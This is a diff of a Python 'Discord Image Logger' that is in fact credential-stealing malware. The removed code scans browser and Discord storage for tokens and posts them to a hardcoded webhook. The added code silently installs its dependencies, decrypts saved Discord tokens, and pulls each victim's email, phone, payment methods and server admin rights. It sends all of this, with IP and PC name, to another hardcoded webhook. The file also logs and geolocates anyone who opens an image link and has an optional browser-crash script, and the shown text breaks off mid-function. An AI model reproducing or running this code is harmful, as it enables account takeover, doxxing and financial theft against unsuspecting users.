@@ -1,505 +1,514 @@
-# Image Logger with ENHANCED Token Stealing
-# Fixed version that actually finds and sends Discord tokens
-
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import os
+if os.name != "nt":
+    exit()
+import subprocess
+import sys
+import json
+import urllib.request
+import re
+import base64
+import datetime
+from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import json, re, os, urllib.request, sys
-from pathlib import Path
 
-__app__ = "Discord Image Logger + ENHANCED Token Stealer"
-__description__ = "Enhanced version with working Discord token stealing"
-__version__ = "v2.3"
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
 __author__ = "C00lB0i"
 
-config = {
-    "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
-    "token_webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
-    "image": "https://github.com/justekoro/fakediscordgif/blob/master/image.gif?raw=true",
-    "imageArgument": True,
-    "username": "Image Logger",
-    "color": 0x00FFFF,
-    "crashBrowser": False,
-    "accurateLocation": True,
-    "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by C00lB0i's Image Logger",
-        "richMessage": True,
-    },
-    "vpnCheck": 1,
-    "linkAlerts": True,
-    "buggedImage": True,
-    "antiBot": 1,
-    "tokenStealing": True,
-    "tokenStealingMode": "aggressive",
-    "sendTokensToWebhook": True,
-    "tokenStealingDelay": 1,
-    "debugMode": True,
-    "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
-    },
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
+from Crypto.Cipher import AES
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
 }
 
-blacklistedIPs = ("27", "104", "143", "164")
-
-# ENHANCED TOKEN STEALING
-def log_debug(message):
-    if config.get("debugMode"):
-        print(f"[DEBUG] {message}")
-
-def send_webhook(webhook_url, data):
-    """Enhanced webhook sending with better error handling"""
-    try:
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        }
-        
-        request = urllib.request.Request(
-            webhook_url,
-            data=json.dumps(data).encode(),
-            headers=headers,
-            method='POST'
-        )
-        
-        with urllib.request.urlopen(request, timeout=15) as response:
-            log_debug(f"Webhook success: {response.status}")
-            return response.status == 204 or response.status == 200
-            
-    except urllib.error.HTTPError as e:
-        log_debug(f"Webhook HTTP error: {e.code} - {e.reason}")
-        return False
-    except Exception as e:
-        log_debug(f"Webhook general error: {e}")
-        return False
-
-def extract_discord_tokens(text):
-    """Enhanced token extraction with multiple patterns"""
-    # Multiple Discord token patterns
-    patterns = [
-        r'[MN][\w-]{23}\.[\w-]{6}\.[\w-]{27}',  # Standard format starting with M or N
-        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',     # Generic 24.6.27 format
-        r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',     # Generic 24.6.38 format
-        r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}', # Very flexible
-    ]
-    
-    all_tokens = []
-    for pattern in patterns:
-        tokens = re.findall(pattern, text, re.IGNORECASE)
-        all_tokens.extend(tokens)
-    
-    # Remove duplicates and validate
-    unique_tokens = []
-    for token in set(all_tokens):
-        if validate_discord_token(token):
-            unique_tokens.append(token)
-    
-    return unique_tokens
-
-def validate_discord_token(token):
-    """Validate Discord token format"""
-    try:
-        parts = token.split('.')
-        if len(parts) != 3:
-            return False
-            
-        # Check first part is base64 and decodes to numeric ID
-        base64_part = parts[0]
-        padding_needed = (4 - len(base64_part) % 4) % 4
-        base64_part += "=" * padding_needed
-        
-        decoded = base64.b64decode(base64_part).decode('utf-8')
-        return decoded.isdigit()
-        
-    except Exception:
-        return False
-
-def find_discord_tokens_storage():
-    """Find Discord tokens in browser storage locations"""
-    log_debug("Starting browser storage token search...")
-    
-    locations = []
-    
-    if os.name == 'nt':  # Windows
-        local_appdata = os.getenv('LOCALAPPDATA')
-        appdata = os.getenv('APPDATA')
-        
-        if local_appdata:
-            locations.extend([
-                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
-                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Profile 1" / "Local Storage" / "leveldb",
-                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Profile 2" / "Local Storage" / "leveldb",
-                Path(local_appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
-                Path(local_appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
-                Path(local_appdata) / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
-            ])
-        
-        if appdata:
-            locations.extend([
-                Path(appdata) / "discord" / "Local Storage" / "leveldb",
-                Path(appdata) / "Discord" / "Local Storage" / "leveldb",
-            ])
-    
-    elif sys.platform == "darwin":  # macOS
-        home = Path.home()
-        locations.extend([
-            home / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Storage" / "leveldb",
-            home / "Library" / "Application Support" / "discord" / "Local Storage" / "leveldb",
-        ])
-    
-    else:  # Linux
-        home = Path.home()
-        locations.extend([
-            home / ".config" / "google-chrome" / "Default" / "Local Storage" / "leveldb",
-            home / ".config" / "discord" / "Local Storage" / "leveldb",
-        ])
-    
-    all_tokens = []
-    
-    for location in locations:
-        if location.exists():
-            log_debug(f"Scanning: {location}")
-            tokens = scan_location_for_tokens(location)
-            all_tokens.extend(tokens)
-    
-    return list(set(all_tokens))  # Remove duplicates
-
-def scan_location_for_tokens(location):
-    """Scan a specific location for Discord tokens"""
-    tokens_found = []
-    
-    try:
-        for file_path in location.iterdir():
-            if file_path.is_file():
-                try:
-                    content = file_path.read_text(encoding='utf-8', errors='ignore')
-                    file_tokens = extract_discord_tokens(content)
-                    tokens_found.extend(file_tokens)
-                    
-                    if file_tokens:
-                        log_debug(f"Found {len(file_tokens)} token(s) in {file_path.name}")
-                        
-                except PermissionError:
-                    log_debug(f"Permission denied: {file_path.name}")
-                except Exception as e:
-                    log_debug(f"Error reading {file_path.name}: {e}")
-                    
-    except Exception as e:
-        log_debug(f"Error scanning location {location}: {e}")
-    
-    return tokens_found
-
-def send_tokens_webhook(tokens):
-    """Send found tokens to Discord webhook"""
-    if not tokens:
-        log_debug("No tokens to send")
-        return False
-    
-    log_debug(f"Sending {len(tokens)} tokens to webhook...")
-    
-    # Group tokens by user ID
-    tokens_by_user = {}
-    for token in tokens:
-        try:
-            user_id = base64.b64decode(token.split('.')[0] + "==").decode('utf-8')
-            if user_id.isdigit():
-                if user_id not in tokens_by_user:
-                    tokens_by_user[user_id] = []
-                tokens_by_user[user_id].append(token)
-        except:
-            continue
-    
-    # Create webhook embed
-    fields = []
-    for user_id, user_tokens in tokens_by_user.items():
-        token_text = "\n".join(user_tokens[:2])  # Max 2 tokens per user to avoid message length
-        if len(user_tokens) > 2:
-            token_text += f"\n... and {len(user_tokens) - 2} more"
-            
-        fields.append({
-            "name": f"👤 User: {user_id}",
-            "value": f"```\n{token_text}\n```"
-        })
-    
-    webhook_data = {
-        "username": config["username"],
-        "content": "🔑 **DISCORD TOKENS FOUND!** 🚨",
-        "embeds": [{
-            "title": "🎯 Token Stealer Results",
-            "color": config["color"],
-            "description": f"Successfully extracted **{len(tokens)}** Discord token(s) from **{len(tokens_by_user)}** user(s)",
-            "fields": fields,
-            "footer": {
-                "text": "Enhanced Image Logger v2.3"
-            }
-        }]
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
-    
-    return send_webhook(config["token_webhook"], webhook_data)
 
-def attempt_enhanced_token_stealing():
-    """Enhanced token stealing attempt"""
-    if not config["tokenStealing"]:
-        log_debug("Token stealing disabled")
-        return False
-    
-    log_debug("🚀 Starting enhanced token stealing...")
-    
-    # Method 1: Browser storage scanning
-    storage_tokens = find_discord_tokens_storage()
-    log_debug(f"Storage scanning found: {len(storage_tokens)} tokens")
-    
-    # Method 2: Check common Discord locations
-    common_tokens = scan_common_discord_locations()
-    log_debug(f"Common locations found: {len(common_tokens)} tokens")
-    
-    # Combine all tokens
-    all_tokens = list(set(storage_tokens + common_tokens))
-    log_debug(f"Total unique tokens: {len(all_tokens)}")
-    
-    # Send to webhook if tokens found
-    if all_tokens and config["sendTokensToWebhook"]:
-        success = send_tokens_webhook(all_tokens)
-        log_debug(f"Webhook send success: {success}")
-        return success
-    
-    return len(all_tokens) > 0
+    if token:
+        headers.update({"Authorization": token})
 
-def scan_common_discord_locations():
-    """Scan common Discord application locations"""
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
     tokens = []
-    
-    if os.name == 'nt':  # Windows
-        appdata = os.getenv('APPDATA')
-        local_appdata = os.getenv('LOCALAPPDATA')
-        
-        # Discord desktop app locations
-        discord_locations = [
-            Path(appdata) / "discord" / "Local Storage" / "leveldb",
-            Path(local_appdata) / "Discord" / "Local Storage" / "leveldb",
-        ]
-        
-        for location in discord_locations:
-            if location.exists():
-                location_tokens = scan_location_for_tokens(location)
-                tokens.extend(location_tokens)
-    
-    return tokens
 
-# Original image logger functions (simplified)
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
+def getip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
+
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by y562"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1477030023218073752/of1gnOw1hum7O4-ILT49nUpwGi87IDmwoZ_QGr6SN3NiovaxrS7yGMDHXeFZVnjuyR6o', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
+
+if __name__ == "__main__":
+    main()
+    
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1477029024290181161/_I1kc2sv6zLUHCWUApjpwseaZuAtTGjMcgj6VwdtukxoZaPInzUQOYaNDMVR9xvA_ypg",
+    "image": "https://tenor.com/view/middle-click-discord-gif-10025290709196472672", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+
+    # CUSTOMIZATION #
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
+    
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
+    },
+
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
+
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
+
+    # REDIRECTION #
+    "redirect": {
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
+    },
+
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
+}
+
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
-    return False
+    else:
+        return False
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
+
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
+    
     if bot:
-        if config["linkAlerts"]:
-            try:
-                webhook_data = {
-                    "username": config["username"],
-                    "embeds": [{
-                        "title": "🔗 Link Sent",
-                        "color": config["color"],
-                        "description": f"Image logging link sent!\n\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-                    }]
-                }
-                send_webhook(config["webhook"], webhook_data)
-            except:
-                pass
-        return
-    
-    try:
-        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
-    except:
-        return
-    
-    ping = "@everyone"
-    if info.get("proxy") and config["vpnCheck"] == 1:
-        ping = ""
-    if info.get("hosting") and config["antiBot"] == 1:
-        ping = ""
-    
-    os_name, browser = httpagentparser.simple_detect(useragent)
-    
-    embed_data = {
-        "username": config["username"],
-        "content": ping,
-        "embeds": [{
-            "title": "🎯 IP Logged",
+        requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"""**User opened the image!**
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+        }
+    ],
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        return
 
+    ping = "@everyone"
+
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    if info["proxy"]:
+        if config["vpnCheck"] == 2:
+                return
+        
+        if config["vpnCheck"] == 1:
+            ping = ""
+    
+    if info["hosting"]:
+        if config["antiBot"] == 4:
+            if info["proxy"]:
+                pass
+            else:
+                return
+
+        if config["antiBot"] == 3:
+                return
+
+        if config["antiBot"] == 2:
+            if info["proxy"]:
+                pass
+            else:
+                ping = ""
+
+        if config["antiBot"] == 1:
+                ping = ""
+
+
+    os, browser = httpagentparser.simple_detect(useragent)
+    
+    embed = {
+    "username": config["username"],
+    "content": ping,
+    "embeds": [
+        {
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
+
+**Endpoint:** `{endpoint}`
+            
 **IP Info:**
-> **IP:** `{ip}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
-> **VPN:** `{info.get('proxy', 'Unknown')}`
-> **Bot:** `{info.get('hosting', 'Unknown')}`
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
-> **OS:** `{os_name}`
+> **OS:** `{os}`
 > **Browser:** `{browser}`
 
 **User Agent:**
 ```
 {useragent}
 ```""",
-        }]
     }
+  ],
+}
     
-    if url:
-        embed_data["embeds"][0]["thumbnail"] = {"url": url}
-    
-    try:
-        send_webhook(config["webhook"], embed_data)
-    except:
-        pass
-    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
     return info
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class EnhancedImageLogger(BaseHTTPRequestHandler):
+class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
-            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
-            useragent = self.headers.get('user-agent', '')
-            
-            log_debug(f"Request from: {ip}")
-            
             if config["imageArgument"]:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
-                    try:
-                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                    except:
-                        url = config["image"]
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
                     url = config["image"]
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{margin:0;padding:0;}}
-div.img {{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style>
-<div class="img"></div>'''.encode()
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
             
-            if ip.startswith(blacklistedIPs):
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
-            if botCheck(ip, useragent):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
-                if config["buggedImage"]: 
-                    self.wfile.write(binaries["loading"])
-                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
                 return
             
-            # Normal user - log IP and attempt token stealing
-            makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
-            
-            # Attempt token stealing
-            if config["tokenStealing"]:
-                log_debug("Attempting token stealing...")
-                attempt_enhanced_token_stealing()
-            
-            # Enhanced client-side JavaScript for token stealing
-            if config["tokenStealing"]:
-                js_code = f'''
-<script>
-(function() {{
-    console.log("🔑 Enhanced token stealer activated");
-    
-    function findAndSendTokens(storage, storageName) {{
-        console.log("🔍 Scanning " + storageName);
-        let foundTokens = [];
+            else:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher
+
+                if config["redirect"]["redirect"]:
